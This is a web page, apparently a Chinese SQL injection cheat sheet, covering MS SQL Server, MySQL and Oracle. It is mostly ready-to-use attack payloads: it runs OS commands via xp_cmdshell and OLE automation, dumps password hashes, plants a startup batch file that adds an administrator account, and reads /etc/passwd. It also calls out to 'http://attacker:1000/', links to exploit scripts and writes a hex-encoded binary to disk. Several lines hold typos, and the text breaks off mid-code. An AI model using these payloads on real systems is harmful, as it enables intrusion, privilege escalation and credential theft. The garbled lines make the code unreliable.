TABLE #Results(ColumnName nvarchar(370),ColumnValue nvarchar(3630);SET NOCOUNT ON;DECLARE @TableName nvarchar(256),@columnNamenvarchar(128), @Searchstr2 nvarchar(110) SET @TableName = ''; SET @searchstr2 = QUOTENAME('%'+'dave'+'%',''''); WHILE @TableName IS NOT NULL BEGIN SET @columnName = ''; SET @TableName =(SELECT MIN (QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE_TABLE' AND OUOTENAME (TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) &gt; @rableName AND OBJECTPROPERTY (OBJECT_ID(QUOTENAME(TABLE_SCHEMA)+ QUOTENAME(TABLE_NAME)),'IsMSShipped') = 0); WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL) BEGIN SET @ColumnName =(SELECT MIN (QUOTENAME(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA PARSENAME (@TableName, 2) AND TABLE_NAME = PARSENAME(@TableName, 1) AND DATA_TYPE IN ('char', 'varchar', 'nchar','nvarchar') AND QUOTENAME (COLUMN_NAME) &gt; @columnName); IF @ColumnName IS NOT NULL BEGIN INSERT INTO #Results EXEC('SELECT '''+@rableName +'.'+@columnName+''',LEFT('+@columnName +', 3630) FROM'+ @rableName+'(NOLOCK)+'WHERE' + @columnName + 'LIKE'+@Searchstr2); END END END select ColumnName, ColumnValue into foo FROM # Results</code><br>URL编码</td></tr></tbody></table><ol start="2"><li>SQL 盲注函数：Microsoft SQL Server</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查  询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LEN()  </code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SUBSTRING(string,offset,length) </code></td></tr><tr><td>字符串（’ABC’）不带单引号的表示方式</td><td><code>SELECT char(0x41) + char(0x42) + char(0x43);  </code></td></tr><tr><td>触发时间延迟</td><td><code>WAITFOR DELAY '0:0:9'; --c触发9秒的时间延迟 </code></td></tr><tr><td>IF语句</td><td><code>IF (1=1) SELECT 'A' ELSE SELECT 'B' -- 返回  </code></td></tr></tbody></table><ol start="3"><li>Microsoft SQL Server 的权限提升</li></ol><p>Microsoft SQL Server 的版本号</p><table><thead><tr><th>版本号</th><th>服务包</th></tr></thead><tbody><tr><td>9.00.3042</td><td>Microsoft SQL Server 2005 SP2</td></tr><tr><td>9.00.2047</td><td>Microsoft SQL Server 2005 SP1</td></tr><tr><td>9.00.1399</td><td>Microsoft SQL Server 2005</td></tr><tr><td>8.00.2039</td><td>Microsoft SQL Server 2000 SP4</td></tr><tr><td>8.00.818</td><td>Microsoft SQL Server 2000 SP3  w/Cumulative Patch MS03-031</td></tr><tr><td>8.00.760</td><td>Microsoft SQL Server 2000 SP3</td></tr><tr><td>8.00.532</td><td>Microsoft SQL Server 2000 SP2</td></tr><tr><td>8.00.384</td><td>Microsoft SQL Server 2000 SP1</td></tr><tr><td>8.00.194</td><td>Microsoft SQL Server 2000</td></tr><tr><td>7.00.1063</td><td>Microsoft SQL Server 7.0 SP4</td></tr><tr><td>7.00.961</td><td>Microsoft SQL Server 7.0 SP3</td></tr><tr><td>7.00.842</td><td>Microsoft SQL Server 7.0 SP2</td></tr><tr><td>7.00.699</td><td>Microsoft SQL Server 7.0 SP1</td></tr><tr><td>7.00.623</td><td>Microsoft SQL Server 7.0</td></tr><tr><td>6.50.479</td><td>Microsoft SQL Server 6.5 SP5a Update</td></tr><tr><td>6.50.416</td><td>Microsoft SQL Server 6.5 SP5a</td></tr><tr><td>6.50.415</td><td>Microsoft SQL Server 6.5 SP5</td></tr><tr><td>6.50.281</td><td>Microsoft SQL Server 6.5 SP4</td></tr><tr><td>6.50.258</td><td>Microsoft SQL Server 6.5 SP3</td></tr><tr><td>6.50.240</td><td>Microsoft SQL Server 6.5 SP2</td></tr><tr><td>6.50.213</td><td>Microsoft SQL Server 6.5 SP1</td></tr><tr><td>6.50.201</td><td>Microsoft SQL Server 6.5 RTM</td></tr></tbody></table><ol start="4"><li>OPENROWSET重验证攻击</li></ol><p>下列OPENROWSET查询将尝试使用口令为letmein的sa账户连接到地址为 127.0.0.1 的 SQL Server：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token string">'sa'</span><span class="token punctuation">;</span><span class="token string">'letmein'</span><span class="token punctuation">,</span><span class="token string">'SET FMTONLY OFF execute master..xp_cmdshell "dir"'</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>攻击数据库服务器：Microsoft SQL Server</li></ol><ul><li>通过xp_cmdshell执行系统命令</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_cmdshell <span class="token string">'os command'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新启用xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span> <span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp configure <span class="token keyword">reconfigure</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>xp_cmdshell存储过程已经被删除了，但.dll并未删除，启用它：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token string">'xpsq170.dll'</span><span class="token keyword">EXEC</span> sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> 'xplog70<span class="token punctuation">.</span>dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>xp_cmdshell的替代方案</li></ul><p>作为xp_cmdshell存储过程的替代方案，可以执行下列SQL语句来实现相同的效果:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@altshell</span> <span class="token keyword">INT</span><span class="token keyword">EXEC</span> SP_OACREATE <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@altshell</span> OUTPUT<span class="token keyword">EXEC</span> SP_OAMETHOD <span class="token variable">@altshell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token string">'%systemroot%\system32\cmd.exe /c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>要想在Microsoft SQL Server 2005上执行这个替代的shell,首先要执行下列SQL：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>破解数据库口令</li></ul><p>Microsoft SQL Server 2000的口令哈希存储在sysxlogins表中，可以使用下列SQL语句提取它们</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysxlogins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>Microsoft SQL Server 2005 哈希</li></ul><p>以下SQL语句会检索sa账户的口令哈希：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> password_hash <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'sa'</span><span class="token keyword">SELECT</span> name <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>sql_logins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>文件读/写</li></ul><p>如果拥有INSERT和ADMINISTER BULK OPERATIONS许可，就可以读取本地文件。下列SQL语句会将本地文件c:\boot.ini读取到localfile表中：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> localfile<span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BULK</span> <span class="token keyword">INSERT</span> localfile <span class="token keyword">FROM</span> <span class="token string">'c:\boot.ini'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="MySQL-备忘单"><a href="#MySQL-备忘单" class="headerlink" title="MySQL 备忘单"></a>MySQL 备忘单</h4><ol><li>枚举数据库配置信息和模式</li></ol><p>提取MySQL服务器的配置信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT @@version;</code></td></tr><tr><td>当前用户</td><td><code>SELECT user();</code><br><code>SELECT system user();</code></td></tr><tr><td>列出用户</td><td><code>SELECT user FROM mysql.user;</code></td></tr><tr><td>当前用户权限</td><td><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user privileges;</code></td></tr></tbody></table><p>提取MySQL 5.0及之后版本的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT database();</code></td></tr><tr><td>列出数据库</td><td><code>SELECT schema name FROM information  schema.schemata;</code></td></tr><tr><td>列出表</td><td>列出当前数据库中的表：  <br><code>UNION SELECT TABLE_NAME FROM  information_schema.tables WHERE  TABLE_SCHEMA= database();  </code><br>列出所有用户自定义数据库中的所有表： <br><code> SELECT table_schema, tabble_name FROM information_schema.tables  WHERE table_schema!= 'information_schema' AND table_schema !='mysql</code></td></tr><tr><td>列出列</td><td>列出当前数据库中tblUsers表的列名：  <br><code>SELECT column_name FROM information_schema.columns  WHERE  table_name='tblUsers'  #返回 tblUsers 表所有列的列名  </code><br>列出所有用户定义的数据库中的所有列：  <br><code>SELECT table_schema, tabble_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema' AND table schema !='mysql'</code></td></tr></tbody></table><ol start="2"><li>SQL盲注函数:MySQL</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查  询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LENGTH()</code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SELECT SUBSTR(string, offset, length);</code></td></tr><tr><td>字符串(‘ABC’)不带单引号的表示方式</td><td><code>SELECT char(65,66,67);</code></td></tr><tr><td>触发时间延迟</td><td><code>BENCHMARK(1000000,MD5("HACK"));  #触发一个可度量的时间延迟 </code><br><code> SLEEP(10);  #触发一个10秒的时间延迟(MySQL 5以及更高版本)</code></td></tr><tr><td>IF语句</td><td><code>SELECT if (1=1,'A','B'); -- 返回'A'</code></td></tr></tbody></table><ol start="3"><li>攻击数据库服务器：MySQL</li></ol><ul><li>执行系统命令</li></ul><p>可以通过在目标服务器上创建一个定期执行的恶意脚本文件来执行操作系统命令。下列语句用于从MySQL读取内容并将其写入本地文件中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SBLECT <span class="token string">'system_commands'</span> <span class="token keyword">INTO</span> <span class="token keyword">dumpfile</span> trojanpath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来的语句会在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的管理员用户X</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'net user x x /add%26%26 net localgroup administrators x /add'</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'c:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\attack.bat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解数据库口令</li></ul><p>返回一个以冒号分隔的用户名和口令哈希值的列表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>直接攻击数据库</li></ul><p>Windows： <a href="http://www.scoobygang.org/HiDDenWarez/mexec.pl">www.scoobygang.org/HiDDenWarez/mexec.pl</a></p><p>Windows： <a href="http://www.0xdeadbeef.info/exploits/raptor_winudf.tgz">www.0xdeadbeef.info/exploits/raptor_winudf.tgz</a></p><p>基于 UNIX： <a href="http://www.0xdeadbeef.infb/exploits/raptor_udf.c">www.0xdeadbeef.infb/exploits/raptor_udf.c</a></p><ul><li>读取文件</li></ul><p>查看UNIX主机上的/etc/passwd文件</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启用了 MAGIC_QUOTES_GPC,可以使用十六进制字符串代表该文件路径以避免使用单引号字符</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token number">0x2f6574632f706173737764</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#加载/etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>写入文件</li></ul><p>从mytable表中返回所有数据，并将输出写入到/tmp/hacker中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> mytable <span class="token keyword">INTO</span> <span class="token keyword">dumpfile</span> <span class="token string">'/tmp/hacker'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracle-备忘单"><a href="#Oracle-备忘单" class="headerlink" title="Oracle 备忘单"></a>Oracle 备忘单</h4><ol><li>枚举数据库配置信息和模式</li></ol><p>提取Oracle服务器的配置信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT banner FROM v$version;</code></td></tr><tr><td>当前用户</td><td><code>SELECT user FROM dual;</code></td></tr><tr><td>列出用户</td><td><code>SELECT username FROM all users ORDER BY username;</code></td></tr><tr><td>当前用户权限</td><td><code>SELECT * FROM user role_privs;</code> <br><code>SELECT * FROM user_tab_privs;</code><br> <code> SELECT * FROM user_sys_privs;</code><br> <code>SELECT sys_context('USERENV','ISDBA') FROM dual;</code><br><code>SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';</code></td></tr><tr><td>应用服务器主机名</td><td><code>SELECT sys_context('USERENV','HOST') FROM dual;</code><br><code>SELECT sys_context('USERENV','SERVER_HOST') FROM dual;</code></td></tr><tr><td>数据库服务器主机名</td><td><code>SELECT UTL_INADDR.get_host_name FROM dual</code></td></tr><tr><td>建立外部连接</td><td>`SELECT utl_http.request(‘<a href="http://attacker:1000/">http://attacker:1000/</a>‘</td></tr><tr><td>引发错误</td><td>引发包含版本标志的错误  <br><code>AND (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1</code></td></tr></tbody></table><p>提取Oracle数据库的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>数据库名</td><td><code>SELECT global_name FROM global_name;</code></td></tr><tr><td>列出模式/用户</td><td><code>SELECT username FROM all_users;</code></td></tr><tr><td>列出表名及其模式</td><td><code>SELECT ower,table_name FROM all_users;</code></td></tr><tr><td>列出列</td><td><code>SELECT ower, table_name, column_name FROM all_tab_columns WHERE table_name= 'tblUsers';</code></td></tr></tbody></table><p>数据库中的加密信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>经过加密的表</td><td><code>SELECT table_name, column_name,  encryption_alg, salt FROM  dba_encrypted_columns;</code> <br> 从Oracle 10g开始，可以对表使用透明加密。考虑到性能原因，通常只对最重要的列进行加密</td></tr><tr><td>列出使用加密库的对象</td><td><code>SELECT owner, name, type, referenced_name  FROM all_dependencies;</code><br>  显示使用了数据库加密的对象(例如，DBMS_CRYPTO和DBMS_OBFUSCATION_TOOLKIT中的密码)</td></tr><tr><td>列出包含’crypt’字符串的PL/SQL函数</td><td><code>SELECT  owner,object_name,procedure_name  FROM all_procedures where  (lower(object_name) LIKE '%crypt%' or lower(procedure_name) like '%crypt%') AND object_name not in ('DBMS OBFUSCATION  TOOLKIT','DBMS_CRYPTO_TOOLKIT')</code></td></tr></tbody></table><ol start="2"><li>SQL盲注函数：Oracle</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查  询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LENGTH()</code></td></tr><tr><td>从给定字符串中提 取子串</td><td><code>SELECT SUBSTR(string,offset,length) FROM dual;</code></td></tr><tr><td>字符串（’ABC’）不带 单引号的表示方式</td><td>`SELECT chr(65)</td></tr><tr><td>触发时间延迟</td><td><code>SELECT UTL_INADDR.get_host_address('nowhere999.zom') FROM dual;  -- 触发可度量的时间延迟</code></td></tr></tbody></table><ol start="3"><li>攻击数据库服务器：Oracle</li></ol><p>Oracle中存在两种不同类型的注入：传统SQL注入和PL/SQL注入。在PL/SQL注入中， 可以执行整个PL/SQL块；而在传统的SQL注入中，通常则只能修改单条SQL语句。</p><ul><li>命令执行</li></ul><p>使用下列脚本实现系统命令的执行和本地文件的读/写访问:</p><p><a href="http://www.0xdeadbeef.infb/exploits/raptor_oraexec.sql">www.0xdeadbeef.infb/exploits/raptor_oraexec.sql</a></p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">www.0xdeadbeef.info/exploits/raptor_oraextproc.sql</a></p><ul><li>读本地文件</li></ul><p>从Oracle服务器读取本地文件</p><p>读本地文件：XMLType</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory GETPWDIR <span class="token keyword">as</span> <span class="token string">'C:\APP\ROOT\PRODUCT\11.1.0\DB_1\OWB\J2EE\CONFIG'</span><span class="token punctuation">;</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@user'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'/'</span><span class="token operator">||</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection—factory/@password'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'@'</span><span class="token operator">||</span>substr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>instr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'//'')+2) connFROM table(XMLSequence(extract(xmltype(bfilename('</span>GETPWDIR<span class="token string">','</span><span class="token keyword">data</span><span class="token operator">-</span>sources<span class="token punctuation">.</span>xml<span class="token string">'),nls_charset_id('</span>WE8ISO8859P1<span class="token string">'))/'</span><span class="token operator">/</span><span class="token keyword">data</span><span class="token operator">-</span>sources<span class="token operator">/</span>connection<span class="token operator">-</span>pool<span class="token operator">/</span>connection<span class="token operator">-</span>factory'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读本地文件：Oracle Text</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> files <span class="token punctuation">(</span>id NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>path VARCHR<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">UNIQUE</span><span class="token punctuation">,</span>ot_format <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> files <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'c:\boot.ini'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 将准备要读取的列插入到表中(比如通过SQL注入读取)</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> file_index <span class="token keyword">ON</span> files<span class="token punctuation">(</span>path<span class="token punctuation">)</span> INDEXTYPE <span class="token operator">IS</span> ctxsys<span class="token punctuation">.</span>contextPARAMETERS<span class="token punctuation">(</span><span class="token string">'datastore ctxsys.file_datastore format column ot_format'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 从全文索引检索数据(boot.ini)</span><span class="token keyword">SELECT</span> token_text <span class="token keyword">from</span> dr$fi1e_index$i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>读本地文件(仅限于PL/SQL注入)</li></ul><p>直接连接到数据库来执行PL/SQL块：</p><p>读本地文件：dbms_lob</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';DECLAREbuf varchar2(4096);BEGINLob_loc:= BFILENAME(1MEDIA_DIR'</span><span class="token punctuation">,</span><span class="token string">'aht.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">OPEN</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> DBMS_LOB<span class="token punctuation">.</span>LOB_READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">READ</span> <span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>utl_raw<span class="token punctuation">.</span>cast_to_varchar2<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">CLOSE</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">*</span> via <span class="token keyword">external</span> <span class="token keyword">table</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> products_ext<span class="token punctuation">(</span>prod_id NUMBER<span class="token punctuation">,</span> prod_name VARCHAR2<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prod_desc VARCHAR2<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>prod_category VARCHAR2<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prod_category_desc VARCHAR2<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>list_price NUMBER<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> min_price NUMBER<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> last_updated <span class="token keyword">DATE</span><span class="token punctuation">)</span><span class="token keyword">ORGANIZATION</span> <span class="token keyword">EXTERNAL</span><span class="token punctuation">(</span><span class="token keyword">TYPE</span> oracle_loader<span class="token keyword">DEFAULT</span> <span class="token keyword">DIRECTORY</span> stage_dirACCESS <span class="token keyword">PARAMETERS</span><span class="token punctuation">(</span>RECORDS DELIMITED <span class="token keyword">BY</span> NEWLINEBADFILE ORAHOME<span class="token operator">:</span><span class="token string">'.rhosts'</span>LOGFILE ORAHOME<span class="token operator">:</span><span class="token string">'log_products_ext'</span>FIELDS TERMINATED <span class="token keyword">BY</span> <span class="token string">','</span>MISSING FIELD <span class="token keyword">VALUES</span> ARE <span class="token keyword">NULL</span><span class="token punctuation">(</span>prod_id<span class="token punctuation">,</span> prod_name<span class="token punctuation">,</span> prod_desc<span class="token punctuation">,</span> prod_category<span class="token punctuation">,</span> prod_category_desc<span class="token punctuation">,</span> price<span class="token punctuation">,</span> price_delta<span class="token punctuation">,</span>last_updated <span class="token keyword">char</span> date_format <span class="token keyword">date</span> mask <span class="token string">"dd-mon-yyyy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>LOCATION <span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PARALLEL <span class="token number">5</span>REJECT <span class="token keyword">LIMIT</span> UNLIMITED<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>写本地文件(仅限于PL/SQL注入)</li></ul><p>通过SQL*Plus等客户端来直接连接到数据库。</p><p>写本地文本文件：utl_file</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';DECLAREv_file UTL_FILE.FILE_TYPE;BEGINv_file:= UTL_FILE.FOPEN('</span>EXT<span class="token string">', '</span>aht<span class="token punctuation">.</span>txt<span class="token string">','</span>w<span class="token string">');UTL_FILE.PUT_LINE(v_file, '</span><span class="token keyword">first</span> <span class="token keyword">row</span><span class="token string">');UTL_FILE.NEW_LINE(v_file);UTL_FILE.PUT_LINE(v)file,'</span><span class="token keyword">second</span> <span class="token keyword">row</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>FCLOSE<span class="token punctuation">(</span>v_file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写本地二进制文件：utl file</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';Create or replace directory ext AS '</span><span class="token keyword">C</span><span class="token operator">:</span>\'<span class="token punctuation">;</span><span class="token keyword">DECLARE</span> fi UTL_FILE<span class="token punctuation">.</span>FILE_TYPE<span class="token punctuation">;</span>bu <span class="token keyword">RAW</span><span class="token punctuation">(</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span>bu<span class="token operator">:=</span>hextoraw<span class="token punctuation">(</span><span class="token string">'BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fi<span class="token 